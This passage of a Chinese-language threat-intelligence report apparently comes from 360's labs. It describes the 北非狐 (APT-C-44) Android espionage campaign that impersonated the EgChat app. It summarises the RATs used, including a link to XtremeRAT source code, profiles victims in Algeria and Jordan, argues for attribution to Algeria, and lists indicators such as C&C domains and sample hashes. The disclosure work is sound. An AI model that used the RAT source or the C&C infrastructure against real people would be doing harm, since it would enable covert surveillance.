XtremeRAT XtremeRAT从2010年开始被开发，是一款专业的商业间谍软件，功能丰富，目前XtremeRAT已经开源https://github[.]com/mwsrc/XtremeRAT，因为可以任意修改、编译而被广泛使用。其主要功能如下：
CMD命令
注册表管理
图15 XtremeRAT代码片段
Hallaj Pro RAT Hallaj Pro RAT fixed最近刚被国外厂商报告用于中东地区威胁攻击，Hallaj是著名的NJRat Trojan的修改版，NJRat Trojan也是中东的地区经常被使用的RAT，已被拍拍熊（APT-C-37）、黄金鼠（APT-C-27）等APT组织使用。其主要功能如下：
CMD命令
图16 Hallaj Pro RAT代码片段
Revenge RAT Revenge RAT的第一个版本由阿拉伯语恶意软件程序员Napoleon于2016年6月28日发布，在地下黑客论坛免费分享。RevengeRAT已经被多个APT组织广泛利用。而且其源代码曾经被泄漏过。其主要功能如下：
获得当前窗口标题
设置注册表
执行内存恶意代码
下图显示的是样本的编译时间，其中有一些RAT是公开模块生成，编译时间统一。可以看出攻击从2017年末开始，其中包含有大量测试样本，样本编译数量较多，攻击处于准备阶段，到2018年始终保持样本的迭代， 之后样本功能稳定。
图18 样本编译时间
2018年1月8号一个Facebook用户分享了钓鱼网站创建的聊天室地址（该聊天室地址已失效）。对该用户相关信息进一步分析，我们猜测其为此次攻击的受害者，并且该分享帖中的评论用户可能也是相关受害者。该受害者位于阿尔及利亚，根据该用户点赞的相关账号，我们认为其可能是阿尔及利亚国民军伤残退役人员。
图19 受害者分享的聊天室地址
图20 受害者点赞的账号
在该组织发布的钓鱼帖子中，我们发现了另一个受害者，该受害者声称已经安装了该组织提供的软件，但是最终给出了未安装应用的提示，而实际上这是间谍软件隐藏图标的常规手法。通过分析该受害者相关信息，可以确定其位于约旦。
图21 钓鱼帖子下面的求助信息
在该组织Facebook首页可以看到有数百位用户关注该账号，结合前面提到的第三方托管网站的下载次数，此次攻击活动中的受害者可能多达数百。
图22 仿冒EgChat官方Facebook首页
2013年国外安全厂商批露信息显示，Houdini远控开发者来自阿尔及利亚。而此次攻击中同样使用了Houdini远控，并且攻击活动中所使用的两个钓鱼网站注册信息显示归属于阿尔及利亚，并且其中一个钓鱼网站的注册邮箱后缀归属法国。阿尔及利亚官方语言为 现代标准阿拉伯语 ，国内通用 阿尔及利亚阿拉伯语 ，而 法语 则因殖民历史原因成为国家行政、贸易和教育领域的专用语言。因此，我们推测此次攻击者位于阿尔及利亚。
进一步通过360威胁情报中心（https://ti.360.cn/）域名解析该组织的CC(voly.ddns.net)，发现近期解析的IP均在 41.105.0.0 - 41.105.255.255范围内，而该IP段归属阿尔及利亚。基于以上原因，我们将此次攻击活动归属于阿尔及利亚。
图24 360威胁情报域名解析
图25 域名解析的IP归属阿尔及利亚IP段
阿拉伯剧变给阿拉伯国家政治发展带来了新的挑战，这包括政治版图的碎片化、政治安全的跨国化、恐怖主义的国际化和危机传播的网络化等问题。阿尔及利亚作为非洲北部的一个阿拉伯国家，无疑也面临着这些挑战。近年来，该国深受恐怖动乱之害，对恐怖活动保持高压打击态势。此次北非狐组织（APT-C-44）网络攻击活动中使用的伪装对象具有较强的针对性，目标人群对聊天应用安全性要求比较高，结合以及阿尔及利亚国内的政治状态，我们推测此次攻击活动主要为了通过网络攻击活动占领情报先机，防止恐怖主义冒头，从而维护国家政治稳定。
随着智能手机行业的高速发展，各种技术的迭代更新，手机功能变得更强大，智能手机逐渐成了人们工作生活中必不可少的工具。因此将会有越来越多的攻击组织会把移动端作为攻击的必备目标。在这种形式下，国内相关企业需要做好各个平台的安全防护以及相关的安全培训。
样本md5 Android 80bbdc982ed7d5728c9005f1713db4c7
78fc9320dc84109cd50d17379fada888
C&C https://voly.ddns.net
http://egchaat.com （已失效）
http://www.moltqana.com
PDB C:\Documents and Settings\Administrateur\Bureau\1830.pdb
C:\Documents and Settings\Administrateur\Bureau\5552.pdb
360高级威胁研究院是360政企安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露多个国家级APT组织的高级行动，赢得业内外的广泛认可，为360保障国家网络安全提供有力支撑。
360 烽火实验室
360烽火实验室致力于移动恶意软件分析、移动灰黑产研究、移动威胁预警、移动APT的发现与追踪等移动安全领域的深入研究。作为全球顶级移动安全生态研究实验室，360烽火实验室在全球范围内不仅首发了多篇具备国际影响力的移动安全生态研究成果，并且成功狩猎了蔓灵花、拍拍熊等多个APT组织针对我国及境外重要目标的攻击活动。实验室在为360手机卫士、360手机助手、360加固保等公司产品提供核心安全数据的同时，也为科研单位、手机厂商、应用商店及上百家国内外合作伙伴提供了移动应用安全检测服务，全方位守护移动安全。
